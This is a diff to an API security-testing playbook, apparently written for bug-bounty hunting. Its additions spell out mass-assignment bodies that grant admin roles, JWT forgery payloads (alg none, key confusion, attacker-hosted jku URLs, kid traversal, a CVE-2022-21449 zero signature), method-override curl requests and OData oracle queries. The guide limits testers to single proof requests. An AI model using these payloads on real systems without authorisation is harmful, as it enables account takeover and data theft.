@@ -8,7 +8,7 @@ description: "Hunt API security misconfiguration — mass assignment, JWT attack
 | You see | Do once | Proves |
 |---|---|---|
 | `PATCH`/`POST` JSON object saved to a user/order | Add `role`/`is_admin`/`verified`/`price`/`tenant_id` the UI never sends | Re-read returns the extra field, and a privileged action succeeds |
-| `Authorization: Bearer eyJ…` or a JWT cookie | Decode header. Test `alg` confusion and embedded `jwk`/`jku` — do not guess the HMAC secret | Forged token reads another user's object |
+| `Authorization: Bearer eyJ…` or a JWT cookie | Decode header. Test `alg` confusion and embedded `jwk`/`jku`. HMAC: three known defaults once each, then stop — no wordlist | Forged token reads another user's object |
 | JSON merge, `qs` query, or `lodash`/`_.merge` on the server | `__proto__` / `constructor.prototype` with a unique property | Property appears on a later request's behavior, or a proven gadget fires |
 | Authz only documented for `POST` | Same path with `GET`, `PUT`, and `X-HTTP-Method-Override` | State change or data the other verb was meant to block |
 | `OData-Version` or `/odata/` or `/_api/` | `$metadata`, then one `$filter`/`$orderby` on a field you should not see | Foreign row or a boolean oracle on a sensitive column |
@@ -25,15 +25,24 @@ Send one extra field at a time on the write the app already allows (`/me`, `/pro
  "tenant_id":"B","org_id":"B","account_id":"B","price":0,"balance":0,"permissions":["*"]}
 ```
 
-Also: form-encoded instead of JSON, `role=user&role=admin` (parser takes the last), a JSON array wrapping one object, and nested `user[role]=admin`. GraphQL input objects are the same bug (`hunt-graphql`). Impact is the **privileged action** that now works, not the field sitting in JSON.
+Also: form-encoded instead of JSON, `role=user&role=admin` (parser takes the last), duplicate JSON keys in **both** orders (`{"role":"user","role":"admin"}` and the reverse), `Content-Type: application/merge-patch+json` on the same object, a JSON array wrapping one object, nested `user[role]=admin`, and JSON Patch on the same write:
+
+```http
+PATCH /api/me HTTP/1.1
+Content-Type: application/json-patch+json
+
+[{"op":"replace","path":"/role","value":"admin"},{"op":"add","path":"/isAdmin","value":true}]
+```
+
+XML/form on a JSON DTO (`Content-Type: application/xml`) is the same binder. GraphQL input objects are the same bug (`hunt-graphql`). Impact is the **privileged action** that now works, not the field sitting in JSON.
 
 ## JWT (no secret brute-force)
 
-Decode the token. Attacks below forge a token when the **verifier is confused**. They do not recover a strong HMAC secret. If the only key is a high-entropy HMAC secret, stop this branch and hunt `kid`/`jku` or a leaked key in a bundle (`hunt-source-leak`).
+Decode the token. Attacks below forge a token when the **verifier is confused**. They do not recover a strong HMAC secret. After the three known defaults below, a high-entropy HMAC is a stop — hunt `kid`/`jku` or a leaked key in a bundle (`hunt-source-leak`).
 
 | Attack | Token shape | Accept if |
 |---|---|---|
-| `alg: none` | header `{"alg":"none","typ":"JWT"}`, payload with your `sub`/`role`, **empty** signature segment. Try `none` / `None` / `NONE` | API returns B's resource for B's `sub` |
+| `alg: none` | header `{"alg":"none","typ":"JWT"}`, payload with your `sub`/`role`. Try `none` / `None` / `NONE` / `nOnE`. Empty third segment (`header.payload.`) **and** two-segment form with the last dot omitted — libraries disagree | API returns B's resource for B's `sub` |
 | RS256→HS256 | Server verifies RS256. You HMAC-sign with the **public** PEM bytes as the HS256 secret | Same, and only if the library treats the PEM as the HMAC key |
 | Embedded JWK | header `jwk` is your RSA public key, `alg` RS256, you sign with the matching private key | Server trusts the in-token key |
 | `jku` / `x5u` | header URL points at a JWKS you host; the token's `kid` matches that set | Server fetches your URL (OOB) **and** accepts the token |
@@ -41,7 +50,9 @@ Decode the token. Attacks below forge a token when the **verifier is confused**.
 | `kid` file / empty key | `kid` is `../../../../dev/null` or a path the process can read, signed with the bytes that file returns (empty for `/dev/null`) | Accepted. This is a path read, not a wordlist |
 | `kid` SQL/command injection | only if `kid` is concatenated and an error or OOB shows it | One proof request, not a dump |
 
-`jku` to an internal URL is SSRF (`hunt-ssrf`) even when the token is rejected. Claim what happened.
+`jku` to an internal URL is SSRF (`hunt-ssrf`) even when the token is rejected. Claim what happened. If `jku`/`x5u` is allowlisted, one probe each — not a list: host suffix (`https://trusted.example.attacker/jwks`), userinfo (`https://trusted.example@attacker/jwks`), and one open redirect on the trusted host. OOB plus a rejected token is SSRF. An accepted token is confusion.
+
+High-entropy HMAC: do not crack it. Try **once each** the empty key, `secret`, and the jwt.io placeholder `your-256-bit-secret`, then stop. If `alg` is `ES256` (Java stacks, or stack unknown), one CVE-2022-21449 attempt: signature segment is base64url of 64 zero bytes (`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`). A `401` is not the bug.
 
 Validation: one request as the victim `sub` that returns data your real session cannot, or a state change. A token that decodes locally and gets `401` is not confusion. Do not brute-force or crack HMAC secrets.
 
@@ -62,6 +73,7 @@ A polluted prototype is a finding only if it changes a later security decision o
 curl -s -X GET "https://$TARGET/api/user/delete?id=SELF" -H "Authorization: Bearer $A"
 curl -s -X POST "https://$TARGET/api/user/delete?id=SELF" \
   -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $A"
+# Repeat once each with X-HTTP-Method and X-Method-Override (frameworks disagree on the name).
 curl -s -X POST "https://$TARGET/api/user/profile" -d "_method=PUT&role=admin"
 ```
 
@@ -73,7 +85,7 @@ Surfaces: `OData-Version`, `DataServiceVersion`, `/odata/`, `/_api/`, `/api/data
 
 | Class | Request | Proof |
 |---|---|---|
-| Filter oracle | `GET …/contacts?$filter=startswith(email,'a')` | Count or rows change with the prefix. Prove **two characters** of a field you should not read, then stop. Do not reconstruct a password database |
+| Filter oracle | `GET …/contacts?$filter=startswith(email,'a')` or `?$count=true&$filter=…` (count-only, no row dump) | Count or rows change with the prefix. Prove **two characters** of a field you should not read, then stop. Do not reconstruct a password database |
 | Sort leak | `$orderby=secretField desc&$select=id` | Order of public ids reveals the hidden column |
 | Expand IDOR | `$expand=Customer($expand=PaymentMethods)` | Nested entity you cannot `GET` directly |
 | Batch parser gap | `POST $batch` `multipart/mixed` with the same `$filter` the WAF blocked on the outer URL | Inner query returns rows; outer query was blocked |
